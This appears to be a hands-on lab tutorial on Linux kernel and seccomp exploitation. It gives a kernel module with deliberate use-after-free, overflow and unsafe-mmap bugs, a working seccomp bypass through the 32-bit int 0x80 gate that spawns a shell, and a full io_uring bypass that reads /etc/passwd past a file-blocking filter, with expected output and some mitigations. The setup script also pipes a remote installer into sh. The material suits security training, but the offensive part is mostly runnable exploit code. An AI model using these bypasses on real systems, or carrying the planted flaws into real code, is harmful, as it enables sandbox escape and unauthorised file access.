# Tutorial: Kernel Subsystem Attack Surfaces, Seccomp & Constrained Exploitation — Hands-On Lab

## Lab Environment Setup

### VM Requirements

| VM | Role | Specs | OS |
|----|------|-------|----|
| `subsys-dev` | Exploit development & compiling | 4 CPU, 8GB RAM, 60GB disk | Ubuntu 24.04 |
| `subsys-target` | Vulnerable kernel target (QEMU guests) | 4 CPU, 8GB RAM, 40GB disk | Custom kernel |
| `subsys-detect` | Detection engineering & forensics | 4 CPU, 8GB RAM, 40GB disk | Ubuntu 24.04 |

### Network Topology

```
┌───────────────────────────────────────────────────────────┐
│ Lab Network: 10.5.2.0/24                                  │
│                                                           │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐   │
│  │  subsys-dev  │  │subsys-target │  │subsys-detect │   │
│  │  10.5.2.10   │  │  10.5.2.20   │  │  10.5.2.30   │   │
│  │              │  │              │  │              │   │
│  │ Build tools  │  │ QEMU + vuln  │  │ Falco/Tracee │   │
│  │ Exploit dev  │  │ Docker/LXC   │  │ Volatility3  │   │
│  │ seccomp-bpf  │  │ Containers   │  │ auditd/SIEM  │   │
│  └──────────────┘  └──────────────┘  └──────────────┘   │
│                                                           │
└───────────────────────────────────────────────────────────┘
```

### Tool Installation Script

```bash
#!/bin/bash
# install_subsystem_lab.sh — Setup all three VMs
# Run with sudo on each VM

set -euo pipefail

ROLE="${1:-dev}"  # dev, target, or detect

install_common() {
    apt-get update && apt-get install -y \
        build-essential gcc g++ make cmake \
        git curl wget jq \
        python3 python3-pip python3-venv \
        nasm gdb strace ltrace \
        libseccomp-dev libseccomp2 seccomp \
        libcap-dev libcap-ng-dev \
        bpfcc-tools bpftrace libbpf-dev \
        linux-tools-common linux-tools-generic \
        auditd audispd-plugins \
        docker.io containerd runc \
        nftables iptables \
        libfuse3-dev fuse3 \
        keyutils \
        net-tools iproute2 tcpdump
    
    pip3 install --break-system-packages \
        seccomp pwntools capstone keystone-engine \
        volatility3 yara-python
}

install_dev() {
    install_common
    
    # libseccomp development
    git clone https://github.com/seccomp/libseccomp /opt/libseccomp
    cd /opt/libseccomp && ./autogen.sh && ./configure && make -j$(nproc) && make install
    
    # seccomp-tools (Ruby-based filter disassembler)
    apt-get install -y ruby ruby-dev
    gem install seccomp-tools
    
    # syzkaller for driver fuzzing
    apt-get install -y golang-go
    git clone https://github.com/google/syzkaller /opt/syzkaller
    cd /opt/syzkaller && make -j$(nproc)
    
    # QEMU for kernel testing
    apt-get install -y qemu-system-x86 qemu-utils
    
    # Kernel source for module development
    apt-get install -y linux-source linux-headers-$(uname -r)
    
    # seccomp-bpf validator
    git clone https://github.com/david942j/seccomp-tools /opt/seccomp-tools-src
    
    echo "[+] Dev environment ready"
}

install_target() {
    install_common
    
    # Docker with seccomp support
    systemctl enable --now docker
    usermod -aG docker $SUDO_USER
    
    # Vulnerable container images
    docker pull ubuntu:22.04
    docker pull alpine:3.18
    
    # QEMU for custom kernels
    apt-get install -y qemu-system-x86 qemu-utils \
        debootstrap libguestfs-tools
    
    # cgroup v1 support (for release_agent lab)
    mkdir -p /sys/fs/cgroup/rdma 2>/dev/null || true
    
    # Kubernetes (single-node for lab)
    curl -sfL https://get.k3s.io | sh -s - --write-kubeconfig-mode 644
    
    echo "[+] Target environment ready"
}

install_detect() {
    install_common
    
    # Falco
    curl -fsSL https://falco.org/repo/falcosecurity-packages.asc | \
        gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg
    echo "deb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] \
        https://download.falco.org/packages/deb stable main" > \
        /etc/apt/sources.list.d/falcosecurity.list
    apt-get update && apt-get install -y falco
    
    # Tracee
    docker pull aquasec/tracee:latest
    
    # Tetragon
    curl -fsSL https://github.com/cilium/tetragon/releases/latest/download/tetragon-linux-amd64.tar.gz | \
        tar xz -C /opt/
    
    # Volatility3
    git clone https://github.com/volatilityfoundation/volatility3 /opt/volatility3
    cd /opt/volatility3 && pip3 install --break-system-packages -e .
    
    # LiME for memory acquisition
    apt-get install -y linux-headers-$(uname -r)
    git clone https://github.com/504ensicsLabs/LiME /opt/lime
    cd /opt/lime/src && make
    
    # YARA
    apt-get install -y yara
    
    # crash utility
    apt-get install -y crash linux-image-$(uname -r)-dbgsym 2>/dev/null || \
        apt-get install -y crash
    
    # Sigma tooling
    pip3 install --break-system-packages sigma-cli pySigma pySigma-backend-elasticsearch
    
    echo "[+] Detection environment ready"
}

case "$ROLE" in
    dev) install_dev ;;
    target) install_target ;;
    detect) install_detect ;;
    *) echo "Usage: $0 {dev|target|detect}"; exit 1 ;;
esac
```

### Vulnerable Kernel Module for Subsystem Labs

```c
// subsys_vuln.c — Vulnerable kernel module exposing multiple subsystem attack surfaces
// Build: make -C /lib/modules/$(uname -r)/build M=$(pwd) modules

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/ioctl.h>
#include <linux/delay.h>
#include <linux/workqueue.h>
#include <linux/timer.h>
#include <linux/completion.h>

#define DEVICE_NAME "subsys_vuln"
#define IOCTL_MAGIC 'S'

#define IOCTL_ALLOC_OBJ     _IOW(IOCTL_MAGIC, 1, unsigned long)
#define IOCTL_FREE_OBJ      _IO(IOCTL_MAGIC, 2)
#define IOCTL_USE_OBJ       _IO(IOCTL_MAGIC, 3)
#define IOCTL_RACE_ALLOC    _IOW(IOCTL_MAGIC, 4, unsigned long)
#define IOCTL_RACE_FREE     _IO(IOCTL_MAGIC, 5)
#define IOCTL_OVERFLOW_IOCTL _IOW(IOCTL_MAGIC, 6, unsigned long)
#define IOCTL_MMAP_VULN     _IOW(IOCTL_MAGIC, 7, unsigned long)
#define IOCTL_FILP_UAF      _IO(IOCTL_MAGIC, 8)

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Vulnerable subsystem lab module");

static dev_t dev_num;
static struct cdev subsys_cdev;
static struct class *subsys_class;

struct vuln_object {
    void (*callback)(struct vuln_object *);
    char data[256];
    struct list_head list;
    unsigned long refcount;
};

static struct vuln_object *global_obj = NULL;
static DEFINE_MUTEX(obj_mutex);
static struct workqueue_struct *vuln_wq;
static struct completion race_done;

static void default_callback(struct vuln_object *obj) {
    pr_info("subsys_vuln: callback executed on obj %px\n", obj);
}

// Vulnerability 1: UAF via ioctl race (no locking on free path)
static void race_free_work(struct work_struct *work) {
    msleep(10); // simulate delay
    if (global_obj) {
        pr_info("subsys_vuln: race_free freeing obj %px\n", global_obj);
        kfree(global_obj);
        // BUG: does not NULL the pointer
    }
    complete(&race_done);
    kfree(work);
}

// Vulnerability 2: ioctl buffer overflow (unchecked size from user)
struct overflow_request {
    unsigned long size;
    char __user *data;
};

// Vulnerability 3: Incorrect mmap implementation (exposes kernel pages)
static int vuln_mmap(struct file *filp, struct vm_area_struct *vma) {
    unsigned long pfn;
    
    if (!global_obj)
        return -EINVAL;
    
    // BUG: maps kernel heap object directly to userspace without validation
    pfn = virt_to_phys(global_obj) >> PAGE_SHIFT;
    
    if (remap_pfn_range(vma, vma->vm_start, pfn,
                        vma->vm_end - vma->vm_start,
                        vma->vm_page_prot))
        return -EAGAIN;
    
    return 0;
}

static long subsys_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
    struct vuln_object *obj;
    struct overflow_request req;
    struct work_struct *work;
    
    switch (cmd) {
    case IOCTL_ALLOC_OBJ:
        obj = kmalloc(arg ? arg : sizeof(struct vuln_object), GFP_KERNEL);
        if (!obj) return -ENOMEM;
        obj->callback = default_callback;
        memset(obj->data, 0, sizeof(obj->data));
        obj->refcount = 1;
        mutex_lock(&obj_mutex);
        global_obj = obj;
        mutex_unlock(&obj_mutex);
        pr_info("subsys_vuln: allocated obj %px size %lu\n", obj, arg);
        return 0;
    
    case IOCTL_FREE_OBJ:
        mutex_lock(&obj_mutex);
        if (global_obj) {
            kfree(global_obj);
            global_obj = NULL;  // proper nulling
        }
        mutex_unlock(&obj_mutex);
        return 0;
    
    case IOCTL_USE_OBJ:
        // BUG: no lock, races with RACE_FREE
        if (global_obj && global_obj->callback) {
            global_obj->callback(global_obj);
        }
        return 0;
    
    case IOCTL_RACE_ALLOC:
        init_completion(&race_done);
        obj = kmalloc(arg ? arg : sizeof(struct vuln_object), GFP_KERNEL);
        if (!obj) return -ENOMEM;
        obj->callback = default_callback;
        obj->refcount = 1;
        global_obj = obj;
        pr_info("subsys_vuln: race_alloc obj %px\n", obj);
        return 0;
    
    case IOCTL_RACE_FREE:
        // BUG: frees via workqueue without locking, doesn't NULL pointer
        work = kmalloc(sizeof(*work), GFP_KERNEL);
        if (!work) return -ENOMEM;
        INIT_WORK(work, race_free_work);
        queue_work(vuln_wq, work);
        return 0;
    
    case IOCTL_OVERFLOW_IOCTL:
        if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
            return -EFAULT;
        if (!global_obj)
            return -EINVAL;
        // BUG: no bounds check on req.size vs obj->data capacity
        if (copy_from_user(global_obj->data, req.data, req.size))
            return -EFAULT;
        pr_info("subsys_vuln: wrote %lu bytes to obj\n", req.size);
        return 0;
    
    case IOCTL_MMAP_VULN:
        // handled by mmap fops
        return 0;
    
    case IOCTL_FILP_UAF:
        // BUG: frees the file's private_data without clearing reference
        if (filp->private_data) {
            kfree(filp->private_data);
            // does not set private_data = NULL
        }
        return 0;
    
    default:
        return -ENOTTY;
    }
}

static int subsys_open(struct inode *inode, struct file *filp) {
    filp->private_data = kzalloc(64, GFP_KERNEL);
    return 0;
}

static int subsys_release(struct inode *inode, struct file *filp) {
    kfree(filp->private_data);
    return 0;
}

static const struct file_operations subsys_fops = {
    .owner = THIS_MODULE,
    .open = subsys_open,
    .release = subsys_release,
    .unlocked_ioctl = subsys_ioctl,
    .mmap = vuln_mmap,
};

static int __init subsys_init(void) {
    int ret;
    
    ret = alloc_chrdev_region(&dev_num, 0, 1, DEVICE_NAME);
    if (ret < 0) return ret;
    
    cdev_init(&subsys_cdev, &subsys_fops);
    ret = cdev_add(&subsys_cdev, dev_num, 1);
    if (ret < 0) goto err_cdev;
    
    subsys_class = class_create(DEVICE_NAME);
    if (IS_ERR(subsys_class)) { ret = PTR_ERR(subsys_class); goto err_class; }
    
    device_create(subsys_class, NULL, dev_num, NULL, DEVICE_NAME);
    
    vuln_wq = create_singlethread_workqueue("subsys_vuln_wq");
    if (!vuln_wq) { ret = -ENOMEM; goto err_wq; }
    
    pr_info("subsys_vuln: loaded, device /dev/%s\n", DEVICE_NAME);
    return 0;

err_wq:
    device_destroy(subsys_class, dev_num);
    class_destroy(subsys_class);
err_class:
    cdev_del(&subsys_cdev);
err_cdev:
    unregister_chrdev_region(dev_num, 1);
    return ret;
}

static void __exit subsys_exit(void) {
    destroy_workqueue(vuln_wq);
    device_destroy(subsys_class, dev_num);
    class_destroy(subsys_class);
    cdev_del(&subsys_cdev);
    unregister_chrdev_region(dev_num, 1);
    if (global_obj) kfree(global_obj);
    pr_info("subsys_vuln: unloaded\n");
}

module_init(subsys_init);
module_exit(subsys_exit);
```

**Makefile:**

```makefile
obj-m += subsys_vuln.o

KDIR ?= /lib/modules/$(shell uname -r)/build

all:
	make -C $(KDIR) M=$(PWD) modules

clean:
	make -C $(KDIR) M=$(PWD) clean

install:
	insmod subsys_vuln.ko
	chmod 666 /dev/subsys_vuln

uninstall:
	rmmod subsys_vuln
```

---

## PART A: OFFENSIVE (Attack Scenarios)

### Exercise 1: Seccomp Filter Analysis and Bypass via Architecture Confusion

**Objective:** Analyze seccomp BPF filters, identify weaknesses, and bypass a filter lacking architecture validation by switching to 32-bit syscall interface.

**Step 1: Build a vulnerable seccomp sandbox (missing arch check)**

```c
// vuln_sandbox.c — Sandbox with architecture confusion vulnerability
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <sys/syscall.h>
#include <stddef.h>
#include <string.h>
#include <errno.h>

void install_vulnerable_filter(void) {
    // BUG: No architecture check — only blocks x86_64 syscall numbers
    struct sock_filter filter[] = {
        // Load syscall number
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 offsetof(struct seccomp_data, nr)),
        // Block execve (59 on x86_64)
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 59, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        // Block execveat (322 on x86_64)
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 322, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        // Allow everything else
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };
    
    struct sock_fprog prog = {
        .len = sizeof(filter) / sizeof(filter[0]),
        .filter = filter,
    };
    
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0) {
        perror("prctl(NO_NEW_PRIVS)");
        exit(1);
    }
    
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog) < 0) {
        perror("prctl(SECCOMP_MODE_FILTER)");
        exit(1);
    }
    
    printf("[sandbox] Filter installed — execve blocked (x86_64 nr=59)\n");
}

int main(int argc, char *argv[]) {
    install_vulnerable_filter();
    
    printf("[sandbox] Attempting normal execve...\n");
    // This will be killed by seccomp:
    // execve("/bin/sh", NULL, NULL);
    
    printf("[sandbox] Sandbox active. PID=%d, try to escape!\n", getpid());
    printf("[sandbox] Hint: the filter doesn't check architecture field\n");
    
    // Keep running so the attacker can inject or the bypass can work
    if (argc > 1 && strcmp(argv[1], "--exec") == 0) {
        // Try normal execve — should be killed
        char *args[] = {"/bin/sh", "-c", "echo ESCAPED", NULL};
        execve("/bin/sh", args, NULL);
        perror("execve blocked as expected");
    }
    
    // Wait for external bypass injection
    pause();
    return 0;
}
```

**Step 2: Build the architecture confusion bypass**

```c
// arch_bypass.c — Bypass seccomp via 32-bit syscall interface
// Compile: gcc -m32 -o arch_bypass arch_bypass.c (or use inline asm for 64-bit binary)
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <stddef.h>
#include <string.h>

// For a 64-bit binary, invoke 32-bit execve via int 0x80
// i386 execve = syscall 11 (not blocked by the filter checking only nr=59)

void install_vulnerable_filter(void) {
    struct sock_filter filter[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 offsetof(struct seccomp_data, nr)),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 59, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 322, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };
    struct sock_fprog prog = {
        .len = sizeof(filter) / sizeof(filter[0]),
        .filter = filter,
    };
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
}

int main(void) {
    install_vulnerable_filter();
    
    printf("[*] Seccomp filter active (blocks x86_64 execve nr=59)\n");
    printf("[*] Attempting bypass via int 0x80 (i386 execve nr=11)\n");
    
    // Invoke execve through the 32-bit syscall gate
    // int 0x80 uses i386 syscall numbers: execve = 11
    char *filename = "/bin/sh";
    char *argv[] = {"/bin/sh", "-c", "echo '[+] BYPASS SUCCESSFUL: shell via int 0x80'; id", NULL};
    char *envp[] = {NULL};
    
    __asm__ volatile (
        "mov %0, %%ebx\n"       // filename -> ebx
        "mov %1, %%ecx\n"       // argv -> ecx
        "mov %2, %%edx\n"       // envp -> edx
        "mov $11, %%eax\n"      // i386 execve syscall number
        "int $0x80\n"           // 32-bit syscall gate
        :
        : "r"(filename), "r"(argv), "r"(envp)
        : "eax", "ebx", "ecx", "edx"
    );
    
    // If we get here, bypass failed
    perror("[-] Bypass failed");
    return 1;
}
```

**Step 3: Demonstrate the correct filter (with arch validation)**

```c
// secure_sandbox.c — Properly hardened seccomp filter
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <stddef.h>

void install_secure_filter(void) {
    struct sock_filter filter[] = {
        // [0] Load architecture
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 offsetof(struct seccomp_data, arch)),
        // [1] Validate arch == x86_64
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
        // [2] Wrong arch → KILL (blocks int 0x80 bypass)
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        // [3] Load syscall number
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 offsetof(struct seccomp_data, nr)),
        // [4] Block execve
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 59, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        // [6] Block execveat
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 322, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        // [8] Allow everything else
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };
    struct sock_fprog prog = {
        .len = sizeof(filter) / sizeof(filter[0]),
        .filter = filter,
    };
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
    printf("[secure] Filter with arch check installed\n");
}

int main(void) {
    install_secure_filter();
    
    printf("[secure] Try the int 0x80 bypass — it will be killed\n");
    
    // The int 0x80 bypass attempt will now SIGKILL this process
    // because the architecture check rejects non-x86_64 syscalls
    char *filename = "/bin/sh";
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    
    __asm__ volatile (
        "mov %0, %%ebx\n"
        "mov %1, %%ecx\n"
        "mov %2, %%edx\n"
        "mov $11, %%eax\n"
        "int $0x80\n"
        :
        : "r"(filename), "r"(argv), "r"(envp)
        : "eax", "ebx", "ecx", "edx"
    );
    
    printf("[secure] This should never print\n");
    return 0;
}
```

**Step 4: Use seccomp-tools to disassemble and analyze filters**

```bash
# Disassemble the filter from a running process
seccomp-tools dump ./vuln_sandbox

# Expected output for vulnerable filter:
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0001: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0003
#  0002: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
#  0003: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0005
#  0004: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
#  0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#
# VULNERABILITY: No arch check at offset 0!

# Analyze the secure filter:
seccomp-tools dump ./secure_sandbox

# Expected output:
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
#  0002: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
#  0003: 0x20 0x00 0x00 0x00000000  A = sys_number
#  ...
```

**Verification:**
```bash
# Compile and test
gcc -o vuln_sandbox vuln_sandbox.c
gcc -o arch_bypass arch_bypass.c
gcc -o secure_sandbox secure_sandbox.c

# Test vulnerable sandbox — bypass succeeds
./arch_bypass
# Expected: "[+] BYPASS SUCCESSFUL: shell via int 0x80"

# Test secure sandbox — bypass killed
./secure_sandbox
# Expected: process killed by SIGKILL (exit code 137)
```

---

### Exercise 2: Seccomp Filter Bypass via io_uring

**Objective:** Demonstrate how io_uring bypasses seccomp filters by performing file operations through the submission ring instead of individual syscalls.

**Step 1: Create a seccomp sandbox that blocks openat/read/write but allows io_uring**

```c
// iouring_bypass.c — Bypass seccomp file-access restrictions via io_uring
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/io_uring.h>
#include <stddef.h>
#include <stdatomic.h>
#include <errno.h>

#define QUEUE_DEPTH 8
#define READ_SIZE 4096

// io_uring structures
struct io_uring_sq {
    unsigned *head;
    unsigned *tail;
    unsigned *ring_mask;
    unsigned *ring_entries;
    unsigned *flags;
    unsigned *array;
    struct io_uring_sqe *sqes;
    size_t ring_sz;
    void *ring_ptr;
};

struct io_uring_cq {
    unsigned *head;
    unsigned *tail;
    unsigned *ring_mask;
    unsigned *ring_entries;
    struct io_uring_cqe *cqes;
    size_t ring_sz;
    void *ring_ptr;
};

struct io_uring_ctx {
    int ring_fd;
    struct io_uring_sq sq;
    struct io_uring_cq cq;
};

static int io_uring_setup(unsigned entries, struct io_uring_params *p) {
    return syscall(425, entries, p);
}

static int io_uring_enter(int fd, unsigned to_submit, unsigned min_complete,
                          unsigned flags, void *arg, size_t argsz) {
    return syscall(426, fd, to_submit, min_complete, flags, arg, argsz);
}

int setup_io_uring(struct io_uring_ctx *ctx) {
    struct io_uring_params params;
    memset(&params, 0, sizeof(params));
    
    ctx->ring_fd = io_uring_setup(QUEUE_DEPTH, &params);
    if (ctx->ring_fd < 0) {
        perror("io_uring_setup");
        return -1;
    }
    
    // Map submission queue
    size_t sq_ring_sz = params.sq_off.array + params.sq_entries * sizeof(unsigned);
    void *sq_ptr = mmap(NULL, sq_ring_sz, PROT_READ | PROT_WRITE,
                        MAP_SHARED | MAP_POPULATE, ctx->ring_fd,
                        IORING_OFF_SQ_RING);
    if (sq_ptr == MAP_FAILED) return -1;
    
    ctx->sq.ring_ptr = sq_ptr;
    ctx->sq.ring_sz = sq_ring_sz;
    ctx->sq.head = sq_ptr + params.sq_off.head;
    ctx->sq.tail = sq_ptr + params.sq_off.tail;
    ctx->sq.ring_mask = sq_ptr + params.sq_off.ring_mask;
    ctx->sq.ring_entries = sq_ptr + params.sq_off.ring_entries;
    ctx->sq.flags = sq_ptr + params.sq_off.flags;
    ctx->sq.array = sq_ptr + params.sq_off.array;
    
    // Map SQEs
    size_t sqe_sz = params.sq_entries * sizeof(struct io_uring_sqe);
    ctx->sq.sqes = mmap(NULL, sqe_sz, PROT_READ | PROT_WRITE,
                        MAP_SHARED | MAP_POPULATE, ctx->ring_fd,
                        IORING_OFF_SQES);
    if (ctx->sq.sqes == MAP_FAILED) return -1;
    
    // Map completion queue
    size_t cq_ring_sz = params.cq_off.cqes +
                        params.cq_entries * sizeof(struct io_uring_cqe);
    void *cq_ptr = mmap(NULL, cq_ring_sz, PROT_READ | PROT_WRITE,
                        MAP_SHARED | MAP_POPULATE, ctx->ring_fd,
                        IORING_OFF_CQ_RING);
    if (cq_ptr == MAP_FAILED) return -1;
    
    ctx->cq.ring_ptr = cq_ptr;
    ctx->cq.ring_sz = cq_ring_sz;
    ctx->cq.head = cq_ptr + params.cq_off.head;
    ctx->cq.tail = cq_ptr + params.cq_off.tail;
    ctx->cq.ring_mask = cq_ptr + params.cq_off.ring_mask;
    ctx->cq.ring_entries = cq_ptr + params.cq_off.ring_entries;
    ctx->cq.cqes = cq_ptr + params.cq_off.cqes;
    
    return 0;
}

int submit_openat(struct io_uring_ctx *ctx, const char *path) {
    unsigned tail = *ctx->sq.tail;
    unsigned index = tail & *ctx->sq.ring_mask;
    
    struct io_uring_sqe *sqe = &ctx->sq.sqes[index];
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode = IORING_OP_OPENAT;
    sqe->fd = AT_FDCWD;
    sqe->addr = (unsigned long)path;
    sqe->open_flags = O_RDONLY;
    sqe->user_data = 1;
    
    ctx->sq.array[index] = index;
    atomic_store_explicit((_Atomic unsigned *)ctx->sq.tail, tail + 1,
                          memory_order_release);
    
    return io_uring_enter(ctx->ring_fd, 1, 1, IORING_ENTER_GETEVENTS, NULL, 0);
}

int submit_read(struct io_uring_ctx *ctx, int fd, char *buf, size_t len) {
    unsigned tail = *ctx->sq.tail;
    unsigned index = tail & *ctx->sq.ring_mask;
    
    struct io_uring_sqe *sqe = &ctx->sq.sqes[index];
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode = IORING_OP_READ;
    sqe->fd = fd;
    sqe->addr = (unsigned long)buf;
    sqe->len = len;
    sqe->off = 0;
    sqe->user_data = 2;
    
    ctx->sq.array[index] = index;
    atomic_store_explicit((_Atomic unsigned *)ctx->sq.tail, tail + 1,
                          memory_order_release);
    
    return io_uring_enter(ctx->ring_fd, 1, 1, IORING_ENTER_GETEVENTS, NULL, 0);
}

int get_cqe_result(struct io_uring_ctx *ctx) {
    unsigned head = *ctx->cq.head;
    unsigned tail = *ctx->cq.tail;
    
    if (head == tail) return -EAGAIN;
    
    unsigned index = head & *ctx->cq.ring_mask;
    struct io_uring_cqe *cqe = &ctx->cq.cqes[index];
    int result = cqe->res;
    
    atomic_store_explicit((_Atomic unsigned *)ctx->cq.head, head + 1,
                          memory_order_release);
    return result;
}

void install_file_blocking_filter(void) {
    // Block openat, read (for files), write — but ALLOW io_uring syscalls
    struct sock_filter filter[] = {
        // Validate architecture
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, arch)),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        // Load syscall number
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
        // Block openat (257)
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 257, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | (EPERM & 0xFFFF)),
        // Block open (2)
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 2, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | (EPERM & 0xFFFF)),
        // Allow everything else (including io_uring: 425, 426, 427)
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };
    struct sock_fprog prog = {
        .len = sizeof(filter) / sizeof(filter[0]),
        .filter = filter,
    };
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
}

int main(void) {
    struct io_uring_ctx ctx;
    char buf[READ_SIZE] = {0};
    const char *target = "/etc/passwd";
    
    // Setup io_uring BEFORE installing seccomp (io_uring_setup needs to succeed)
    printf("[*] Setting up io_uring...\n");
    if (setup_io_uring(&ctx) < 0) {
        fprintf(stderr, "[-] io_uring setup failed (kernel may have io_uring disabled)\n");
        fprintf(stderr, "    Check: sysctl io_uring_disabled\n");
        return 1;
    }
    printf("[+] io_uring ring fd = %d\n", ctx.ring_fd);
    
    // Install seccomp filter that blocks openat/open
    printf("[*] Installing seccomp filter (blocks openat, open)...\n");
    install_file_blocking_filter();
    
    // Verify direct openat is blocked
    printf("[*] Testing direct openat('%s')...\n", target);
    int direct_fd = open(target, O_RDONLY);
    if (direct_fd < 0) {
        printf("[+] Direct open blocked as expected: %s\n", strerror(errno));
    } else {
        printf("[-] Direct open succeeded (filter not working)\n");
        close(direct_fd);
    }
    
    // Bypass via io_uring OPENAT operation
    printf("[*] Bypassing via io_uring OPENAT...\n");
    if (submit_openat(&ctx, target) < 0) {
        perror("[-] submit_openat");
        return 1;
    }
    
    int opened_fd = get_cqe_result(&ctx);
    if (opened_fd < 0) {
        printf("[-] io_uring openat failed: %d (%s)\n", opened_fd, strerror(-opened_fd));
        printf("    (On kernels 5.12+, io_uring may enforce seccomp per-op)\n");
        return 1;
    }
    printf("[+] io_uring opened '%s' as fd=%d (BYPASS SUCCESSFUL)\n", target, opened_fd);
    
    // Read the file via io_uring
    if (submit_read(&ctx, opened_fd, buf, READ_SIZE - 1) < 0) {
        perror("[-] submit_read");
        return 1;
    }
    
    int bytes = get_cqe_result(&ctx);
    if (bytes > 0) {
        printf("[+] Read %d bytes via io_uring:\n", bytes);
        printf("--- BEGIN FILE CONTENT ---\n");
        write(STDOUT_FILENO, buf, bytes > 512 ? 512 : bytes);
        printf("\n--- END (truncated) ---\n");
    }
    
    return 0;
}
```

**Expected output (on kernels < 5.12 without io_uring seccomp enforcement):**
```
[*] Setting up io_uring...
[+] io_uring ring fd = 3
[*] Installing seccomp filter (blocks openat, open)...
[*] Testing direct openat('/etc/passwd')...
[+] Direct open blocked as expected: Operation not permitted
[*] Bypassing via io_uring OPENAT...
[+] io_uring opened '/etc/passwd' as fd=4 (BYPASS SUCCESSFUL)
[+] Read 1847 bytes via io_uring:
--- BEGIN FILE CONTENT ---
root:x:0:0:root:/root:/bin/bash
...
```

**Verification and mitigation:**
```bash
# Check if io_uring is enabled
sysctl io_uring_disabled 2>/dev/null || echo "sysctl not available (kernel < 6.1)"

# Mitigation: block io_uring syscalls in seccomp filter
# Add these to the filter:
# BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 425, 0, 1),  // io_uring_setup
# BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
# BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 426, 0, 1),  // io_uring_enter
# BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
